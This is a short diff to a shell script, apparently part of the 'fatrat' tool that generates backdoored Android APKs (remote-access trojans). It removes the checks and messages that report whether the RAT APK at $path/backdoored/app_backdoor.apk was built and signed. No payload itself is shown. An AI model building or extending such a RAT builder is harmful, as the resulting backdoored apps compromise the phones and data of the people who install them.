@@ -944,20 +944,7 @@ echo $yourport >> $apkconfig
 ./createapk
 echo ""
 sleep 2
-varopt="$path/backdoored/app_backdoor.apk"
-sleep 2
-rm -rf $path/temp/* >/dev/null 2>&1
-if [ ! -f $varopt ]; then
-    echo -e $red "[!] There was an error in the creation of your RAT APK file :
-- Check ($path/logs/apk.log) for more detailed information ."
    read -rsp $'Press any key to continue to return to fatrat menu\n' -n 1 key
-menu
-else
-echo -ne $green" Your RAT apk was successfully builded and signed , it is located here :
- $path/backdoored/app_backdoor.apk"
-fi
-read loveyou
-echo
 clear
 menu
 }
